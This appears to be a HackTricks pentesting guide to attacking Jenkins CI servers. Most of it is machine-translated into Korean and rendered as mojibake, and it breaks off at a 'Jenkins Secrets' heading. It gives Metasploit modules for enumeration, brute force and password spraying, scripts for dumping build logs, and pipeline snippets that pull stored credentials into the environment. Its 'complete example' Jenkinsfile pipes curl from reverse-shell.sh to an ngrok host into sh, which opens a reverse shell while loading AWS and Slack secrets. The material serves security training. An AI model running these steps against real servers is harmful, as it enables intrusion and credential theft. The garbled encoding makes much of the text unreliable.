# Jenkins Security

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

JenkinsëŠ” ê±°ì˜ **ëª¨ë“ ** ì¡°í•©ì˜ **í”„ë¡œê·¸ë˜ë° ì–¸ì–´**ì™€ ì†ŒìŠ¤ ì½”ë“œ ë¦¬í¬ì§€í† ë¦¬ë¥¼ ì‚¬ìš©í•˜ì—¬ **ì§€ì†ì  í†µí•©** ë˜ëŠ” **ì§€ì†ì  ë°°í¬** (CI/CD) í™˜ê²½ì„ ì„¤ì •í•˜ëŠ” ê°„ë‹¨í•œ ë°©ë²•ì„ ì œê³µí•˜ëŠ” ë„êµ¬ì…ë‹ˆë‹¤. ë˜í•œ ë‹¤ì–‘í•œ ì¼ìƒì ì¸ ê°œë°œ ì‘ì—…ì„ ìë™í™”í•©ë‹ˆë‹¤. JenkinsëŠ” **ê°œë³„ ë‹¨ê³„ì— ëŒ€í•œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•  í•„ìš”ì„±ì„ ì—†ì• ì§€ëŠ” ì•Šì§€ë§Œ**, ì „ì²´ ë¹Œë“œ, í…ŒìŠ¤íŠ¸ ë° ë°°í¬ ë„êµ¬ì˜ ìˆœì„œë¥¼ ìˆ˜ë™ìœ¼ë¡œ ì‰½ê²Œ êµ¬ì„±í•  ìˆ˜ ìˆëŠ” ê²ƒë³´ë‹¤ ë” ë¹ ë¥´ê³  ê°•ë ¥í•œ ë°©ë²•ì„ ì œê³µí•©ë‹ˆë‹¤.

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## Unauthenticated Enumeration

ì¸ì¦ ì—†ì´ í¥ë¯¸ë¡œìš´ Jenkins í˜ì´ì§€ë¥¼ ê²€ìƒ‰í•˜ë ¤ë©´ (_/people_ ë˜ëŠ” _/asynchPeople_ì™€ ê°™ì´ í˜„ì¬ ì‚¬ìš©ìë¥¼ ë‚˜ì—´í•¨) ë‹¤ìŒì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
msf> use auxiliary/scanner/http/jenkins_enum
```
ëª…ë ¹ì„ ì¸ì¦ ì—†ì´ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ”ì§€ í™•ì¸í•˜ì‹­ì‹œì˜¤:
```
msf> use auxiliary/scanner/http/jenkins_command
```
ìê²© ì¦ëª…ì´ ì—†ìœ¼ë©´ _**/asynchPeople/**_ ê²½ë¡œ ë˜ëŠ” _**/securityRealm/user/admin/search/index?q=**_ì—ì„œ **ì‚¬ìš©ì ì´ë¦„**ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê²½ë¡œ _**/oops**_ ë˜ëŠ” _**/error**_ì—ì„œ Jenkins ë²„ì „ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![](<../../.gitbook/assets/image (146).png>)

### ì•Œë ¤ì§„ ì·¨ì•½ì 

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## ë¡œê·¸ì¸

ê¸°ë³¸ ì •ë³´ì—ì„œ **Jenkins ë‚´ë¶€ì— ë¡œê·¸ì¸í•˜ëŠ” ëª¨ë“  ë°©ë²•**ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### ë“±ë¡

ê³„ì •ì„ ìƒì„±í•˜ê³  ë¡œê·¸ì¸í•  ìˆ˜ ìˆëŠ” Jenkins ì¸ìŠ¤í„´ìŠ¤ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. **ê·¸ë§Œí¼ ê°„ë‹¨í•©ë‹ˆë‹¤.**

### **SSO ë¡œê·¸ì¸**

ë˜í•œ **SSO** **ê¸°ëŠ¥**/**í”ŒëŸ¬ê·¸ì¸**ì´ ì¡´ì¬í•œë‹¤ë©´ í…ŒìŠ¤íŠ¸ ê³„ì •(ì˜ˆ: í…ŒìŠ¤íŠ¸ **Github/Bitbucket ê³„ì •**)ì„ ì‚¬ìš©í•˜ì—¬ ì• í”Œë¦¬ì¼€ì´ì…˜ì— **ë¡œê·¸ì¸**ì„ ì‹œë„í•´ì•¼ í•©ë‹ˆë‹¤. [**ì—¬ê¸°**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/)ì—ì„œ íŒì„ ì–»ìœ¼ì„¸ìš”.

### ë¸Œë£¨íŠ¸í¬ìŠ¤

**Jenkins**ëŠ” **ë¹„ë°€ë²ˆí˜¸ ì •ì±…**ê³¼ **ì‚¬ìš©ì ì´ë¦„ ë¸Œë£¨íŠ¸í¬ìŠ¤ ì™„í™”**ê°€ ë¶€ì¡±í•©ë‹ˆë‹¤. **ì•½í•œ ë¹„ë°€ë²ˆí˜¸** ë˜ëŠ” **ë¹„ë°€ë²ˆí˜¸ë¡œì„œì˜ ì‚¬ìš©ì ì´ë¦„**ì´ ì‚¬ìš©ë  ìˆ˜ ìˆìœ¼ë¯€ë¡œ **ì‚¬ìš©ì**ë¥¼ **ë¸Œë£¨íŠ¸í¬ìŠ¤**í•˜ëŠ” ê²ƒì´ í•„ìˆ˜ì ì…ë‹ˆë‹¤. ì‹¬ì§€ì–´ **ì—­ìˆœ ì‚¬ìš©ì ì´ë¦„ì„ ë¹„ë°€ë²ˆí˜¸ë¡œ** ì‚¬ìš©í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.
```
msf> use auxiliary/scanner/http/jenkins_login
```
### ë¹„ë°€ë²ˆí˜¸ ìŠ¤í”„ë ˆì´

[ì´ íŒŒì´ì¬ ìŠ¤í¬ë¦½íŠ¸](https://github.com/gquere/pwn\_jenkins/blob/master/password\_spraying/jenkins\_password\_spraying.py) ë˜ëŠ” [ì´ íŒŒì›Œì…¸ ìŠ¤í¬ë¦½íŠ¸](https://github.com/chryzsh/JenkinsPasswordSpray)ë¥¼ ì‚¬ìš©í•˜ì„¸ìš”.

### IP í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ ìš°íšŒ

ë§ì€ ì¡°ì§ì´ **GitHub** ë˜ëŠ” **GitLab**ê³¼ ê°™ì€ **SaaS ê¸°ë°˜ ì†ŒìŠ¤ ì œì–´ ê´€ë¦¬(SCM) ì‹œìŠ¤í…œ**ì„ **ë‚´ë¶€, ìì²´ í˜¸ìŠ¤íŒ… CI** ì†”ë£¨ì…˜ì¸ Jenkins ë˜ëŠ” TeamCityì™€ ê²°í•©í•©ë‹ˆë‹¤. ì´ ì„¤ì •ì€ CI ì‹œìŠ¤í…œì´ **SaaS ì†ŒìŠ¤ ì œì–´ ê³µê¸‰ì—…ì²´**ë¡œë¶€í„° **ì›¹í›… ì´ë²¤íŠ¸**ë¥¼ ìˆ˜ì‹ í•  ìˆ˜ ìˆê²Œ í•˜ì—¬ íŒŒì´í”„ë¼ì¸ ì‘ì—…ì„ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤.

ì´ë¥¼ ë‹¬ì„±í•˜ê¸° ìœ„í•´ ì¡°ì§ì€ **SCM í”Œë«í¼**ì˜ **IP ë²”ìœ„**ë¥¼ **í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸**í•˜ì—¬ **ì›¹í›…**ì„ í†µí•´ **ë‚´ë¶€ CI ì‹œìŠ¤í…œ**ì— ì ‘ê·¼í•  ìˆ˜ ìˆë„ë¡ í—ˆìš©í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ **ëˆ„êµ¬ë‚˜** GitHub ë˜ëŠ” GitLabì— **ê³„ì •**ì„ ìƒì„±í•˜ê³  ì´ë¥¼ **ì›¹í›…ì„ íŠ¸ë¦¬ê±°**í•˜ë„ë¡ êµ¬ì„±í•  ìˆ˜ ìˆë‹¤ëŠ” ì ì— ìœ ì˜í•´ì•¼ í•©ë‹ˆë‹¤. ì´ëŠ” **ë‚´ë¶€ CI ì‹œìŠ¤í…œ**ì— ìš”ì²­ì„ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

í™•ì¸: [https://www.paloaltonetworks.com/blog/prisma-cloud/repository-webhook-abuse-access-ci-cd-systems-at-scale/](https://www.paloaltonetworks.com/blog/prisma-cloud/repository-webhook-abuse-access-ci-cd-systems-at-scale/)

## ë‚´ë¶€ Jenkins ë‚¨ìš©

ì´ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œëŠ” Jenkinsì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ìœ íš¨í•œ ê³„ì •ì´ ìˆë‹¤ê³  ê°€ì •í•©ë‹ˆë‹¤.

{% hint style="warning" %}
Jenkinsì— êµ¬ì„±ëœ **ì¸ì¦** ë©”ì»¤ë‹ˆì¦˜ê³¼ ì†ìƒëœ ì‚¬ìš©ìì˜ ê¶Œí•œì— ë”°ë¼ **ë‹¤ìŒ ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆì„ ìˆ˜ë„ ìˆê³ , ì•„ë‹ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.**
{% endhint %}

ìì„¸í•œ ì •ë³´ëŠ” ê¸°ë³¸ ì •ë³´ë¥¼ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### ì‚¬ìš©ì ëª©ë¡ ë‚˜ì—´

Jenkinsì— ì ‘ê·¼í–ˆë‹¤ë©´ [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)ì—ì„œ ë‹¤ë¥¸ ë“±ë¡ëœ ì‚¬ìš©ìë¥¼ ë‚˜ì—´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### í‰ë¬¸ ë¹„ë°€ ì°¾ê¸°ë¥¼ ìœ„í•œ ë¹Œë“œ ë¤í”„

[ì´ ìŠ¤í¬ë¦½íŠ¸](https://github.com/gquere/pwn\_jenkins/blob/master/dump\_builds/jenkins\_dump\_builds.py)ë¥¼ ì‚¬ìš©í•˜ì—¬ ë¹Œë“œ ì½˜ì†” ì¶œë ¥ ë° ë¹Œë“œ í™˜ê²½ ë³€ìˆ˜ë¥¼ ë¤í”„í•˜ì—¬ í‰ë¬¸ ë¹„ë°€ì„ ì°¾ìœ¼ì„¸ìš”.
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **SSH ìê²© ì¦ëª… íƒˆì·¨**

íƒ€ê²Ÿ ì‚¬ìš©ìê°€ **ìƒˆ Jenkins ë…¸ë“œë¥¼ ìƒì„±/ìˆ˜ì •í•  ìˆ˜ ìˆëŠ” ì¶©ë¶„í•œ ê¶Œí•œ**ì„ ê°€ì§€ê³  ìˆê³  SSH ìê²© ì¦ëª…ì´ ë‹¤ë¥¸ ë…¸ë“œì— ì ‘ê·¼í•˜ê¸° ìœ„í•´ ì´ë¯¸ ì €ì¥ë˜ì–´ ìˆë‹¤ë©´, ê·¸ëŠ” **ìê²© ì¦ëª…ì„ íƒˆì·¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ë…¸ë“œë¥¼ ìƒì„±/ìˆ˜ì •í•˜ê³  **ìê²© ì¦ëª…ì„ ê¸°ë¡í•  í˜¸ìŠ¤íŠ¸ë¥¼ ì„¤ì •**í•˜ì—¬ í˜¸ìŠ¤íŠ¸ í‚¤ë¥¼ ê²€ì¦í•˜ì§€ ì•Šê³  ì§„í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

![](<../../.gitbook/assets/image (218).png>)

Jenkins SSH ìê²© ì¦ëª…ì€ **ì „ì—­ ì œê³µì**(`/credentials/`)ì—ì„œ ì¼ë°˜ì ìœ¼ë¡œ ì°¾ì„ ìˆ˜ ìˆìœ¼ë¯€ë¡œ, ë‹¤ë¥¸ ë¹„ë°€ì„ ë¤í”„í•˜ëŠ” ê²ƒì²˜ëŸ¼ ë¤í”„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë” ë§ì€ ì •ë³´ëŠ” [**ë¹„ë°€ ë¤í”„ ì„¹ì…˜**](./#dumping-secrets)ì—ì„œ í™•ì¸í•˜ì„¸ìš”.

### **Jenkinsì—ì„œì˜ RCE**

**Jenkins ì„œë²„ì—ì„œ ì…¸ì„ ì–»ëŠ” ê²ƒ**ì€ ê³µê²©ìì—ê²Œ ëª¨ë“  **ë¹„ë°€**ê³¼ **í™˜ê²½ ë³€ìˆ˜**ë¥¼ ìœ ì¶œí•˜ê³ , ë™ì¼í•œ ë„¤íŠ¸ì›Œí¬ì— ìˆëŠ” **ë‹¤ë¥¸ ë¨¸ì‹ ì„ ì•…ìš©**í•˜ê±°ë‚˜ **í´ë¼ìš°ë“œ ìê²© ì¦ëª…**ì„ **ìˆ˜ì§‘**í•  ê¸°íšŒë¥¼ ì œê³µí•©ë‹ˆë‹¤.

ê¸°ë³¸ì ìœ¼ë¡œ JenkinsëŠ” **SYSTEMìœ¼ë¡œ ì‹¤í–‰**ë©ë‹ˆë‹¤. ë”°ë¼ì„œ ì´ë¥¼ íƒ€ê²Ÿìœ¼ë¡œ ì‚¼ìœ¼ë©´ ê³µê²©ìëŠ” **SYSTEM ê¶Œí•œ**ì„ ì–»ê²Œ ë©ë‹ˆë‹¤.

### **í”„ë¡œì íŠ¸ ìƒì„±/ìˆ˜ì •ìœ¼ë¡œ RCE ì–»ê¸°**

í”„ë¡œì íŠ¸ë¥¼ ìƒì„±/ìˆ˜ì •í•˜ëŠ” ê²ƒì€ Jenkins ì„œë²„ì—ì„œ RCEë¥¼ ì–»ëŠ” ë°©ë²•ì…ë‹ˆë‹¤:

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **Groovy ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ìœ¼ë¡œ RCE ì–»ê¸°**

Groovy ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ì—¬ RCEë¥¼ ì–»ì„ ìˆ˜ë„ ìˆìœ¼ë©°, ì´ëŠ” ìƒˆë¡œìš´ í”„ë¡œì íŠ¸ë¥¼ ìƒì„±í•˜ëŠ” ê²ƒë³´ë‹¤ ë” ì€ë°€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### íŒŒì´í”„ë¼ì¸ ìƒì„±/ìˆ˜ì •ìœ¼ë¡œ RCE ì–»ê¸°

**íŒŒì´í”„ë¼ì¸ì„ ìƒì„±/ìˆ˜ì •í•˜ì—¬ RCEë¥¼ ì–»ì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤**:

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## íŒŒì´í”„ë¼ì¸ ì•…ìš©

íŒŒì´í”„ë¼ì¸ì„ ì•…ìš©í•˜ë ¤ë©´ ì—¬ì „íˆ Jenkinsì— ì ‘ê·¼í•  ìˆ˜ ìˆì–´ì•¼ í•©ë‹ˆë‹¤.

### ë¹Œë“œ íŒŒì´í”„ë¼ì¸

**íŒŒì´í”„ë¼ì¸**ì€ **í”„ë¡œì íŠ¸ì˜ ë¹Œë“œ ë©”ì»¤ë‹ˆì¦˜**ìœ¼ë¡œë„ ì‚¬ìš©ë  ìˆ˜ ìˆìœ¼ë©°, ì´ ê²½ìš° **ì €ì¥ì†Œ ë‚´ì˜ íŒŒì¼**ì´ íŒŒì´í”„ë¼ì¸ êµ¬ë¬¸ì„ í¬í•¨í•˜ë„ë¡ êµ¬ì„±ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê¸°ë³¸ì ìœ¼ë¡œ `/Jenkinsfile`ì´ ì‚¬ìš©ë©ë‹ˆë‹¤:

![](<../../.gitbook/assets/image (127).png>)

ë˜í•œ **ë‹¤ë¥¸ ìœ„ì¹˜ì— íŒŒì´í”„ë¼ì¸ êµ¬ì„± íŒŒì¼ì„ ì €ì¥**í•˜ëŠ” ê²ƒë„ ê°€ëŠ¥í•˜ë©°(ì˜ˆ: ë‹¤ë¥¸ ì €ì¥ì†Œ) ì´ëŠ” **ì €ì¥ì†Œ ì ‘ê·¼**ê³¼ **íŒŒì´í”„ë¼ì¸ ì ‘ê·¼**ì„ **ë¶„ë¦¬**í•˜ëŠ” ëª©ì ì…ë‹ˆë‹¤.

ê³µê²©ìê°€ **í•´ë‹¹ íŒŒì¼ì— ëŒ€í•œ ì“°ê¸° ê¶Œí•œ**ì„ ê°€ì§€ê³  ìˆë‹¤ë©´, ê·¸ëŠ” ì´ë¥¼ **ìˆ˜ì •**í•˜ê³  **íŒŒì´í”„ë¼ì¸ì„ íŠ¸ë¦¬ê±°**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. Jenkinsì— ì ‘ê·¼í•˜ì§€ ì•Šê³ ë„ ê°€ëŠ¥í•©ë‹ˆë‹¤.\
ê³µê²©ìê°€ **ì¼ë¶€ ë¸Œëœì¹˜ ë³´í˜¸ë¥¼ ìš°íšŒí•´ì•¼ í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤**(í”Œë«í¼ê³¼ ì‚¬ìš©ì ê¶Œí•œì— ë”°ë¼ ìš°íšŒ ê°€ëŠ¥ ì—¬ë¶€ê°€ ë‹¬ë¼ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤).

ì‚¬ìš©ì ì •ì˜ íŒŒì´í”„ë¼ì¸ì„ ì‹¤í–‰í•˜ê¸° ìœ„í•œ ê°€ì¥ ì¼ë°˜ì ì¸ íŠ¸ë¦¬ê±°ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

* **ì£¼ ë¸Œëœì¹˜ì— ëŒ€í•œ Pull request** (ë˜ëŠ” ë‹¤ë¥¸ ë¸Œëœì¹˜ì— ëŒ€í•´)
* **ì£¼ ë¸Œëœì¹˜ì— Push** (ë˜ëŠ” ë‹¤ë¥¸ ë¸Œëœì¹˜ì— ëŒ€í•´)
* **ì£¼ ë¸Œëœì¹˜ë¥¼ ì—…ë°ì´íŠ¸**í•˜ê³  ì–´ë–¤ ì‹ìœ¼ë¡œë“  ì‹¤í–‰ë  ë•Œê¹Œì§€ ê¸°ë‹¤ë¦¬ê¸°

{% hint style="info" %}
**ì™¸ë¶€ ì‚¬ìš©ì**ì¸ ê²½ìš°, **ë‹¤ë¥¸ ì‚¬ìš©ì/ì¡°ì§ì˜ ì €ì¥ì†Œì˜ ì£¼ ë¸Œëœì¹˜ì— PRì„ ìƒì„±**í•˜ê³  **íŒŒì´í”„ë¼ì¸ì„ íŠ¸ë¦¬ê±°**í•  ê²ƒìœ¼ë¡œ ê¸°ëŒ€í•´ì„œëŠ” ì•ˆ ë©ë‹ˆë‹¤... í•˜ì§€ë§Œ **ì˜ëª» êµ¬ì„±ëœ ê²½ìš°** ì´ë¥¼ ì•…ìš©í•˜ì—¬ íšŒì‚¬ë¥¼ **ì™„ì „íˆ íƒ€ê²©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.
{% endhint %}

### íŒŒì´í”„ë¼ì¸ RCE

ì´ì „ RCE ì„¹ì…˜ì—ì„œëŠ” [**íŒŒì´í”„ë¼ì¸ì„ ìˆ˜ì •í•˜ì—¬ RCEë¥¼ ì–»ëŠ” ê¸°ìˆ **](./#rce-creating-modifying-pipeline)ì´ ì´ë¯¸ ì–¸ê¸‰ë˜ì—ˆìŠµë‹ˆë‹¤.

### í™˜ê²½ ë³€ìˆ˜ í™•ì¸

**ì „ì²´ íŒŒì´í”„ë¼ì¸ ë˜ëŠ” íŠ¹ì • ë‹¨ê³„ì— ëŒ€í•´ ì¼ë°˜ í…ìŠ¤íŠ¸ í™˜ê²½ ë³€ìˆ˜ë¥¼ ì„ ì–¸**í•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. ì´ í™˜ê²½ ë³€ìˆ˜ëŠ” **ë¯¼ê°í•œ ì •ë³´ë¥¼ í¬í•¨í•´ì„œëŠ” ì•ˆ ë˜ì§€ë§Œ**, ê³µê²©ìëŠ” í•­ìƒ **ëª¨ë“  íŒŒì´í”„ë¼ì¸** êµ¬ì„±/Jenkinsfileì„ **í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**:
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### ë¹„ë°€ ë¤í”„

Jenkinsì—ì„œ ë¹„ë°€ì´ ì¼ë°˜ì ìœ¼ë¡œ ì–´ë–»ê²Œ ì²˜ë¦¬ë˜ëŠ”ì§€ì— ëŒ€í•œ ì •ë³´ëŠ” ê¸°ë³¸ ì •ë³´ë¥¼ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

ìê²© ì¦ëª…ì€ **ì „ì—­ ì œê³µì**(`/credentials/`) ë˜ëŠ” **íŠ¹ì • í”„ë¡œì íŠ¸**(`/job/<project-name>/configure`)ì— **ë²”ìœ„ê°€ ì§€ì •**ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ëª¨ë“  ë¹„ë°€ì„ ìœ ì¶œí•˜ë ¤ë©´ **ë¹„ë°€ì„ í¬í•¨í•˜ëŠ” ëª¨ë“  í”„ë¡œì íŠ¸ë¥¼ ìµœì†Œí•œ íƒ€í˜‘**í•˜ê³  ì‚¬ìš©ì ì •ì˜/ì˜¤ì—¼ëœ íŒŒì´í”„ë¼ì¸ì„ ì‹¤í–‰í•´ì•¼ í•©ë‹ˆë‹¤.

ë˜ ë‹¤ë¥¸ ë¬¸ì œëŠ”, íŒŒì´í”„ë¼ì¸ì˜ **env** ë‚´ì—ì„œ **ë¹„ë°€ì„ ì–»ìœ¼ë ¤ë©´** **ë¹„ë°€ì˜ ì´ë¦„ê³¼ ìœ í˜•ì„ ì•Œì•„ì•¼** í•œë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, **`usernamePassword`** **ë¹„ë°€**ì„ **`string`** **ë¹„ë°€**ë¡œ **ë¡œë“œ**í•˜ë ¤ê³  í•˜ë©´ ì´ **ì˜¤ë¥˜**ê°€ ë°œìƒí•©ë‹ˆë‹¤:
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
ì—¬ê¸°ì—ì„œ ëª‡ ê°€ì§€ ì¼ë°˜ì ì¸ ë¹„ë°€ ìœ í˜•ì„ ë¡œë“œí•˜ëŠ” ë°©ë²•ì„ ì œê³µí•©ë‹ˆë‹¤:
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
At the end of this page you can **find all the credential types**: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
ëª¨ë“  ë¹„ë°€ì„ **í•œ ë²ˆì— ë¤í”„í•˜ëŠ”** ê°€ì¥ ì¢‹ì€ ë°©ë²•ì€ **Jenkins** ë¨¸ì‹ ì„ **íƒ€ê²©**í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤ (ì˜ˆ: **ë‚´ì¥ ë…¸ë“œ**ì—ì„œ ë¦¬ë²„ìŠ¤ ì…¸ì„ ì‹¤í–‰) ê·¸ë¦¬ê³  **ë§ˆìŠ¤í„° í‚¤**ì™€ **ì•”í˜¸í™”ëœ ë¹„ë°€**ì„ **ìœ ì¶œ**í•œ í›„ ì˜¤í”„ë¼ì¸ì—ì„œ ë³µí˜¸í™”í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.\
ì´ ë°©ë²•ì— ëŒ€í•œ ìì„¸í•œ ë‚´ìš©ì€ [Nodes & Agents section](./#nodes-and-agents)ì™€ [Post Exploitation section](./#post-exploitation)ì—ì„œ í™•ì¸í•˜ì„¸ìš”.
{% endhint %}

### Triggers

From [the docs](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers): The `triggers` directive defines the **automated ways in which the Pipeline should be re-triggered**. For Pipelines which are integrated with a source such as GitHub or BitBucket, `triggers` may not be necessary as webhooks-based integration will likely already be present. The triggers currently available are `cron`, `pollSCM` and `upstream`.

Cron example:
```bash
triggers { cron('H */4 * * 1-5') }
```
Check **other examples in the docs**.

### Nodes & Agents

A **Jenkins instance** might have **different agents running in different machines**. From an attacker perspective, access to different machines means **different potential cloud credentials** to steal or **different network access** that could be abuse to exploit other machines.

For more information check the basic information:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

You can enumerate the **configured nodes** in `/computer/`, you will usually find the **`Built-In Node`** (which is the node running Jenkins) and potentially more:

![](<../../.gitbook/assets/image (249).png>)

It is **specially interesting to compromise the Built-In node** because it contains sensitive Jenkins information.

To indicate you want to **run** the **pipeline** in the **built-in Jenkins node** you can specify inside the pipeline the following config:
```bash
pipeline {
agent {label 'built-in'}
```
### ì™„ì „í•œ ì˜ˆì œ

íŠ¹ì • ì—ì´ì „íŠ¸ì—ì„œì˜ íŒŒì´í”„ë¼ì¸, í¬ë¡  íŠ¸ë¦¬ê±°ì™€ í•¨ê»˜, íŒŒì´í”„ë¼ì¸ ë° ìŠ¤í…Œì´ì§€ í™˜ê²½ ë³€ìˆ˜, ë‹¨ê³„ì—ì„œ 2ê°œì˜ ë³€ìˆ˜ë¥¼ ë¡œë“œí•˜ê³  ë¦¬ë²„ìŠ¤ ì…¸ì„ ì „ì†¡:
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## ì„ì˜ íŒŒì¼ ì½ê¸°ë¥¼ í†µí•œ RCE

{% content-ref url="jenkins-arbitrary-file-read-to-rce-via-remember-me.md" %}
[jenkins-arbitrary-file-read-to-rce-via-remember-me.md](jenkins-arbitrary-file-read-to-rce-via-remember-me.md)
{% endcontent-ref %}

## RCE

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## í¬ìŠ¤íŠ¸ ìµìŠ¤í”Œë¡œì‡

### ë©”íƒ€ìŠ¤í”Œë¡œì‡
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins Secrets

